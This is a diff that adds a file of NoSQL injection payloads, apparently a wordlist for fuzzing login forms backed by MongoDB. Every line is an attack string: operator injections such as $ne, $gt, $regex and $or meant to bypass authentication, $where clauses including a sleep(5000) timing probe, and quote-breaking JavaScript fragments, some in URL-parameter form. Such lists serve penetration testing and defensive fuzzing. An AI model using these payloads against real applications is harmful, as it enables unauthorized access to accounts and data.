@@ -1,0 +1,17 @@
+' || '1'=='1
+' || 1==1 //
+' || '1'=='1'%00
+{"$gt": ""}
+{"$ne": ""}
+{"$where": "1==1"}
+{"$where": "sleep(5000)"}
+admin' || '1'=='1
+admin' || 1==1 //
+";return true;var foo="
+';return true;var foo='
+{"username": {"$ne": null}, "password": {"$ne": null}}
+{"$or": []}
+{"$or": [{}, {"$where": "1==1"}]}
+username[$ne]=admin&password[$ne]=admin
+username[$regex]=.*&password[$regex]=.*
+username[$ne]=null&password[$ne]=null
